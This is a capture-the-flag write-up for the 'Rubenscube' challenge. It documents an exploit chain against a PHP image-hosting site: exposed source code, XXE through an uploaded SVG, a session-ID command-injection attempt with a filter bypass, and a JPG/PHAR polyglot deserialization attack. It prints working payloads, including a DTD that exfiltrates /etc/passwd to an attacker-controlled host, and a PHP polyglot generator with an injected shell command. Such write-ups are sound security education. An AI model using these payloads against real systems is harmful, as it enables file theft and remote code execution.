# Rubenscube
#### Author: Karol Baryła aka mmk1
In this challange we have a website which is very simple image hosting.
Robot image on the front page hints us to visit /robots.txt:
```
User-agent: *
Disallow: /harming/humans
Disallow: /ignoring/human/orders
Disallow: /harm/to/self
Disallow: source.zip
```
/source.zip contains website's source code. Turns out it allows us to upload png, jpg and svg images. One part of source is immediate red flag:
```php
<?php
$xmlfile = file_get_contents($file);
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
$svg = simplexml_import_dom($dom);
?>
```
So we have an XXE. To exploit it we use an svg image to upload:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE data SYSTEM "http://myvpsdomain.something/payload.dtd" >
<svg
	xmlns="http://www.w3.org/2000/svg"
	width="100"
	height="100"
	viewBox="-32 -32 68 68"
	version="1.1">
	<script>&send;</script>
	<circle
		cx="0"
		cy="0"
		r="24"
		fill="#c8c8c8"/>
	</svg>
```
and on vps:
```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://myvpsdomain.something/12ox1321?p=%file;'>">
%all;
```
and that let us read files from system. (Small note: in such challanges it is very useful to have an instance of [https://github.com/Runscope/requestbin]() running on some vps).
At that point I thought that the challange is over, but the flag was nowhere to be found, none of the usual locations was present. After some time I decided that it is probably not enough and started to search for other vulnerability.
```php
<?php
function create_thumb() {
        $file_path = $this->folder . $this->file_name . $this->extension;
        $thumb_path = $this->folder . $this->file_name . "_thumb.jpg";
        system('convert ' . $file_path . " -resize 200x200! " . $thumb_path);
}

Where $this->folder is defined as:
$this->folder = $file_path = "images/" . session_id() . "/";
?>
```

So if we can control session_id, we can perform command injection. 
First attempt on that was to just modify PHPSESSID cookie and hope for the best. 
Suprisingly, it worked on my VPS, with some limitations (', ", \\, space and some other chars were not working, so I had to perform bash commands without them), which I spent some time to bypass (no spaces allowed was the biggest problem. To do commands without them you can do something like: `$(sleep${IFS%?}10)`, which works on bash, dash, sh and probably some others.). After preparing full payload I tried to execute it on VPS, it worked, I had reverse shell. But when I tried to perform it on tasks machine, nothing happened. After spending some time thinking what went wrong and contacting the organizers, it turned out Ubunutu and Debian have different defaults when it comes to restrictions on PHPSESSID. So another dead end.

Third and final vulnerability was PHP unserialization. We can upload an image which is a polyglot: jpg and phar at the same time. Thanks to the earlier discovered XXE we can actually use it. We will be deserializng Image class, to perform earlier mentioned command injection, just in different way than modifying PHPSESSID cookie.
To to that, I tried to use this tool: [https://github.com/kunte0/phar-jpg-polyglot](), but it produced jpgs with wrong header, which were not recignized by the website. So I produced small script to create proper jpg/phar.

Final attack was to first pload polyglot JPG, then upload SVG which loaded our JPG as phar, which then performed command injection.
Final svg:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE data SYSTEM "http://myvpsdomain.something/payload.dtd" >
<svg
	xmlns="http://www.w3.org/2000/svg"
	width="100"
	height="100"
	viewBox="-32 -32 68 68"
	version="1.1">
	<script>&send;</script>
	<circle
		cx="0"
		cy="0"
		r="24"
		fill="#c8c8c8"/>
	</svg>
```
payload.dtd on VPS:
```
<!ENTITY % file SYSTEM "phar://images/ft00qtgjr96vaonmi9ait13k17/0deb0a9444214bb3dd77c8ba2cd50d2cb54f4df2.jpg/test.txt">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://myvpsdomain.something/12ox1321?p=%file;'>">
%all;
```
Script to procude jpg:
```php
<?php
$payload= " ; ./flag_dispenser> images/ft00qtgjr96vaonmi9ait13k17/flag.txt #";
class Image {}
$p = new Phar(__DIR__ . '/avatar.phar', 0);
$p->addFromString("test.txt", "test");
$object = new Image;
$object->folder = $payload;
$object->file_name = '';
$object->extension = '';
$p->setStub("\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xdb\x00\x43\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xc2\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10<?php __HALT_COMPILER(); ?>");
$p->setMetadata($object);

rename(__DIR__ . '/avatar.phar', __DIR__ . '/avatar.jpg');

?>
```
